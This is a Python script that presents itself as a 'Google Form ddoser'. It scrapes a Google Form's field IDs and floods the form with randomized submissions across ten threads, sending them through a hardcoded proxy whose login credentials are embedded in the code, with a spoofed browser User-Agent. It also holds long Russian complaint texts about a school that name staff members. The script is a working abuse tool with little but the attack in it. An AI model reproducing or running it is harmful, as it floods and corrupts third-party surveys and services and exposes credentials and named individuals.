# -*- coding: utf-8 -*-

from json.decoder import JSONDecodeError
import requests
import random

from LogPython import LogManager
import requests
LogManager = LogManager()
import threading
import click

import os
import json
import re
import sys

from http.client import responses

proxies = {"https":"https://cool-leaf-5479p1000:QAKyMxtT@167.99.195.184:5050"}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 Edg/86.0.622.43'
}

_first_answer_ = 'Зачем задавать такой вопрос, если проблема в индивидуальном расписании? - при индивидуальном расписании пропадали уроки, на каждом третьем уроке учеников больше чем посадочных мест, по большей мере хаотичное распределение по группам, например, информатика, физика и русский (когда распределение по уровню было). Даже непонятно, было ли распределение по уровню знаний по некоторым предметам. Отсутствие возможности перейти в другую группу, несмотря на то, что обещали, что это не будет проблемой. По словам преподавателей, чтобы перейти в группу с якобы более высоким уровнем преподавания, нужно решать дополнительное задание, которое будет (момент времени, когда оно должно там появиться естественно не оговаривается) в гугл классе этой группы. К слову, задания в гугл классе нет и, как я думаю, не будет. Так же интересует вопрос с окнами посреди школьного дня, пустые промежутки между седьмым и восьмым уроком, вовремя которых нужно заниматься непонятно чем. Из-за этих бесполезных промежутков ученики возвращаются домой минимум на два часа позже, когда могли вернуться домой и спокойно заняться своими делами, вместо этого они вынуждены находиться в школе и буквально "убивать время". Не говоря о том, что в некоторых случаях на уроке было только половина учеников, а вторая половина шла не по расписанию и из-за этого фактически пропадали уроки, можно сказать о том, что такой урок как физкультура полностью пропал из расписания и его по факту не существует как предмета уже месяц. Недавно поднялся вопрос о том, что группа Регины Рашидовны по геометрии не может написать акр просто потому, что для него нужно два подряд идущих урока, которые у нас есть только заочно. Казалось бы, Аветис Грачевич, как классный руководитель и директор, мог отпустить  учеников с одного, максимум с двух уроков, чтобы они без проблем написали акр. Я бы не писал(а) об этом инциденте, если бы все произошло так, как я предполагал(а), но акр эта группа так и не написала, поэтому пришлось высказать это. Короче говоря, в пуме царит хаос и беспорядок, противоположно словам директора в этой школе полнейшее отсутствие дисциплины и порядка. Не буду затрагивать тему некой иерархии в пуме, которая сформировалась еще в прошлом году и не распалась до сих пор. В некоторый момент времени возникло такое ощущение, что в пуме все делается в последний момент и на скорую руку. Никакой речи о планировании идти не может.'
   
_second_answer_ = 'Например, заранее планировать его, распределить количество учеников в каждой группе и сформировать расписание, а потом только вписывать фамилии учеников. В пум изначально должно было прийти фиксированное количество учеников или же набирали всех, кто захотел, лишь бы набрались классы? - если судить по новому набору учеников, экзамены были по общеобразовательной программе и не выходили за рамки обыкновенной школы. Изначально нужно было формировать расписание, а не доделывать его по десять раз. Если что-то стабильно не работает и исправить это не получается 2 месяца подряд, лучше перейти к тому, что с самого начала работало исправно. Кстати говоря, я не понимаю цели создания индивидуального расписания - разделение по группам были и в прошлом году, при чем достаточно удобное, а индивидуальное расписание только добавляет дополнительные каверзы и неудобства в и так сомнительный в последнее время учебный процесс.'

_third_answer_ = 'Если вы дочитали до этого момента, то я даже опущу момент о том, что подростки приходят в пум со знаниями, а если смогут выйти, то ни с чем. Осталось всего два вопрос, которые я бы хотел(а) обсудить. Первый из них - это огромное количество учеников, которые не только употребляют никотин, но и распространяют идею о его использовании. Казалось бы, пум должен быть кристально прозрачным - школе всего год и два месяца, но такое чувство, что ей уже десятилетие и всей администрации уже совершенно наплевать на происходящее внутри школьных стен. И наконец последний и более насущный вопрос - это выставление оценок новым зам. директором Кристиной Петровной. Оценки не только запаздывают, но иногда не соответствуют тому, что озвучили на уроке. Насколько я понял(а), расписание тоже составляла она, как я писал(а) ранее , расписанием я тоже категорически недоволен(а). Выводы делайте сами'

random_num = [1, 5]

_link = 'https://docs.google.com/forms/d/e/1FAIpQLSdkVj0GVp_ZMV1gab7V7UP0Ct-aij-A4juxI3_roq3sukwR-A/viewform?usp=sf_link'

jojo = random.choice(random_num)

def erase(a:str, b:int):
    a = a[:b] + a[b + 1:]
    
    return a

def SetLink(change):
    try: 
        testing_term = requests.get(change)
    except:
        LogManager.error("Invalid Link (На самом деле инвалид перед экраном)")
        sys.exit(0)
        
    f = open(__file__, "r", encoding = "utf-8")

    regex = r"_link\s*\=\s*\'(.*)\'"

    current_file = f.read()
    f.close()
    r = re.search(regex, current_file).group(1)

    current_file = current_file.replace(r, change)

    f = open(__file__, "w", encoding = "utf-8")
    f.write(current_file)
    f.close()   
     
    LogManager.info("Link changed")
     
def Response(a, *args, **kwargs):
    
    if len(args) != 0:
        resp = requests.get(erase(args[0], 0))
    else:
        resp = requests.get(_link)
            
    if a == "headers":
        LogManager.info(resp.headers)
    elif a == "content":                                                                
        LogManager.info(resp.content)
        
def StatusCode(*args, **kwargs):
    if len(args) != 0:
        r = requests.get(erase(args[0], 0))
    else:
        r = requests.get(_link)
    
        if r.status_code == 200:
            status = "OK"
            LogManager.info(f"{r} === {status}")
        elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
            status = responses[r.status_code]
            LogManager.warning(f"{r} === {status}")
        else:
            status = responses[r.status_code]
            LogManager.error(f"{r} === {status}")

try:
    respG = open("inf.txt", "r", encoding="utf-8").readline()
    respG = json.loads(respG)
except JSONDecodeError:
    LogManager.error("Temp error")
except:
    _temp = open("inf.txt", 'w')
    _temp.close()

def InputUpdater():
    for r in respG:
        r['id'] = 'entry.' + str(r['id'])
                
    return respG 

def GetInput():
    
    os.system("node main.js")  
                        
def SetInput(a):
    resp = requests.get(a).text
    resp = resp[resp.find("var FB_PUBLIC_LOAD_DATA_ "):]
    resp = resp[:resp.find(',"/forms"')]
                 
    LogManager.info('writing complete')
    
    open('dop.js', 'w', encoding = "utf-8").write("module.exports.Getter = function Getter() {\n" + resp + "]" + "\nreturn FB_PUBLIC_LOAD_DATA_;}")
        
def RaidComporator(ServeList):
    res = dict()

    for i in ServeList:
        res[i['id']] = random.choice(i['value'])
        
    res["fvv"] = "1"
    res["draftResponse"] = '[null,null,"-1322386903815409528"]'
    res["pageHistory"] = "0"
    res["fbzx"] = "-1322386903815409528"    
                  
    return res          
                  
jojo = InputUpdater()
                  
def raid(a, b, c, d, e:int):
        
    for i in range(100):
        RaidReqList = RaidComporator(jojo)
                
        r = requests.post(_link, 
                          data = RaidReqList,
                          headers = headers,
                          proxies = proxies)
                
        if r.status_code == 200:
            status = "OK"
            LogManager.info(f"{r} === {e + 1} === {status}")
        elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
            status = responses[r.status_code]
            LogManager.warning(f"{r} === {e + 1} === {status}")
        else:
            status = responses[r.status_code]
            LogManager.error(f"{r} === {e + 1} === {status}")
                        
rand_list = ["Yuno", "Ayumu Kasuga Osaka", "Kiri Komori", "Asuka Soryu Langley", "Kotonoha Katsura", "Machi", "Rika Furude", "Ai Enma", "Nausicaä", "Yoko Littner", "Hitagi Senjougahara", "Ika Musume", "Rena Ryuuguu", "Anna Kurauchi", "Miyako", "Poplar Taneshima", "Akira Amatsume", "Himeko Katagiri", "Suiseiseki", "Hitoha Marui", "Ayumu Nishizawa", "Nadeko Sengoku", "Lum", "Aono Morimiya", "Shion Fujino", "Shiki Ryougi", "Lina Inverse", "Aoi Yamada", "Haruko Haruhara", "Yuki Nagato", "Kaede Fuyou", "Chiri Kitsu", "Ayumi Yamada", "Misaki Nakahara", "Megumi Noda", "Hanyuu Furude", "Kafuka Fuura", "Faye Valentine", "Tomoko Kuroki", "Tamaki Kawazoe", "Kino", "Ayu Tsukimiya", "Mion Sonozaki", "Excel", "Fuuko Ibuki", "Rin Kaga", "Kou", "Celty Sturluson", "Ana Coppola", "Nino", "Sayoko Kurosaki",
             "Tsukasa Hiiragi", "Guchuko", "Sun Seto", "Shouko Kirishima", "Balalaika", "Ukyo Kuonji", "Aika Granzchesta", "Nobue Itoh", "Rebecca Miyamoto", "Alice Carroll", "Isumi Saginomiya", "Ichijou", "Chizuru Minamoto", "Chiaki Minami", "Suigintou", "Marii Buratei", "Nano Shinonome", "Akari Akaza", "Murasaki Kuhouin", "Horo", "Konata Izumi", "Riza Hawkeye", "Sora Kajiwara", "Himeko Inaba", "Dorm Leader", "Risa Koizumi", "Sakaki", "Futaba Marui", "Satsuki Kitaoji", "Nori", "Nagisa Furukawa", "Mahoro Andou", "Rakka", "Chihiro Shindou", "Rei Ayanami", "Haruhi Fujioka", "Yuuko Ichihara", "Mai Kawasumi", "Maki Umezaki", "Tsuyuri", "Kana Minami", "Tsumugi Kotobuki", "Mamimi Samejima", "Olivier Mira Armstrong", "Nanami Aoyama", "Kuro Kagami", "Mashiro Shiina", "Yakumo Tsukamoto", "Matsurika Shinouji"]

da_net = ["Да", "Нет"]

genders = ['Agender', 'Androgyne', 'Androgynous', 'Bigender', 'Cis', 'FTM', 'Gender Fluid', 'Gender Nonconforming', 'Gender Questioning',
           'Gender Variant', 'Genderqueer', 'Neither', 'Neutrois', 'Non-binary', 'Other', 'Pangender', 'Two-spirit', 'Anongender', 'Cavusgender',
           'Zodiacgender', 'Aesthetgender', 'Affectugender', 'Digigender', 'Egogender']

@click.command()
@click.option('--link', default = True, help = 'Show raiding link')
@click.option('--raid', default = 3, help = 'Start ddos any google form`s link')
@click.option('--resp', default = "text", help = "Get response || Post response")
@click.option('--log', default = "jojo", help = "Any actions with logs")
def starter(link, resp, raid, log):                                              
    
    """Google Form`s ddoser script`s help`s command:\\//"""
    
    try:
        if link == "get":
            print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
            print(_link)
        if link == "set":
            print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
            SetLink(input(" Enter new raid link : "))
        
        if resp == "headers":
            Response("headers")                             
        if resp == "content":
            Response("content")
        if "content" in resp and len(resp) != 7:
            Response("content", resp[7:])
        if "headers" in resp and len(resp) != 7:
            Response("headers", resp[7:])
        if "status" in resp and len(resp) != 6:
            StatusCode(resp[6:])
        if "set_input" in resp and len(resp) != 9:
            SetInput(resp[10:])
        if resp == "get_input":                                 
            GetInput()
        if resp == "set_input":
            SetInput(_link);
        if resp == "status":
            StatusCode()
        if log == "cls":
            with open("LogPython_info.log", "w") as log_file:
                log_file.write(" ")
        if raid == 1:

            print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
            print('         /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \   /\    \ ')
            print('        /::\____\                /::\    \                /::\    \                /::\    \                /::\    \                /::\____\ /::\____\'')
            print('       /:::/    /                \:::\    \              /::::\    \              /::::\    \              /::::\    \              /:::/    //:::/    /')
            print('      /:::/    /                  \:::\    \            /::::::\    \            /::::::\    \            /::::::\    \            /:::/    //:::/    / ')
            print('     /:::/    /                    \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/    //:::/    /  ')
            print('    /:::/____/                      \:::\    \        /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/    //:::/    /   ')
            print('   /::::\    \                      /::::\    \      /:::/    \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    //:::/    /    ')
            print('  /::::::\    \   _____    ____    /::::::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    //:::/    /     ')
            print(' /:::/\:::\    \ /\    \  /\   \  /:::/\:::\    \  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/    //:::/    /      ')
            print('/:::/  \:::\    /::\____\/::\   \/:::/  \:::\____\/:::/____/     \:::|    |/:::/__\:::\   \:::|    |/:::/__\:::\   \:::\____\/:::/____//:::/____/       ')
            print('\::/    \:::\  /:::/    /\:::\  /:::/    \::/    /\:::\    \     /:::|____|\:::\   \:::\  /:::|____|\:::\   \:::\   \::/    /\:::\    \\:::\    \       ')
            print(' \/____/ \:::\/:::/    /  \:::\/:::/    / \/____/  \:::\    \   /:::/    /  \:::\   \:::\/:::/    /  \:::\   \:::\   \/____/  \:::\    \\:::\    \      ')
            print('          \::::::/    /    \::::::/    /            \:::\    \ /:::/    /    \:::\   \::::::/    /    \:::\   \:::\    \       \:::\    \\:::\    \     ')
            print('           \::::/    /      \::::/____/              \:::\    /:::/    /      \:::\   \::::/    /      \:::\   \:::\____\       \:::\    \\:::\    \    ')
            print('           /:::/    /        \:::\    \               \:::\  /:::/    /        \:::\  /:::/    /        \:::\   \::/    /        \:::\    \\:::\    \   ')
            print('          /:::/    /          \:::\    \               \:::\/:::/    /          \:::\/:::/    /          \:::\   \/____/          \:::\    \\:::\    \  ')
            print('         /:::/    /            \:::\    \               \::::::/    /            \::::::/    /            \:::\    \               \:::\    \\:::\    \ ')
            print('        /:::/    /              \:::\____\               \::::/    /              \::::/    /              \:::\____\               \:::\____\\:::\____\'')
            print('        \::/    /                \::/    /                \::/____/                \::/____/                \::/    /                \::/    / \::/    /')
            print('         \/____/                  \/____/                  ~~                       ~~                       \/____/                  \/____/   \/____/ ')
            print('                                                                                                                                                        ')
            
            start1()
                    
    except Exception as er:
        LogManager.error(er)

def start1(): 
    i = 123
    _ = list()
    
    for i in range(10):
        thr = threading.Thread(target = raid, args = (_first_answer_, _second_answer_, _third_answer_, jojo, i), deamon = True)
        thr.start()    
        _.append(thr)
        
    [t.join() for t in _]    
        
        # raid(_first_answer_, _second_answer_, _third_answer_, jojo, i)
      
if __name__ == "__main__":  
    
    print('Click Version: {}'.format(click.__version__))
    print('Python Version: {} \n'.format(sys.version))
    
    starter()
    
# 'proxies = {                                                                      
# "https" : "https://159.8.114.34:8123"
# }'

